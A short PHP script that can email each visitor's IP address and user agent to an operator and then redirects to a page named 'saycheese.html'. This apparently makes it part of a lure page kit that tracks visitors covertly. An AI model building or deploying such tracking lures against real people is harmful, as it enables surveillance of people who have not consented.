<?php
// (Optional) Email template for IP alerts
function sendAlert($ip, $ua) {
    $to      = 'you@example.com';
    $subject = "New visitor: $ip";
    $message = "IP: $ip\nUser‑Agent: $ua\nTime: ".date('c');
    mail($to, $subject, $message);
}

// If you want to auto-email each visit, uncomment:
# sendAlert($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);

// Then redirect:
header('Location: saycheese.html');
exit;
?>
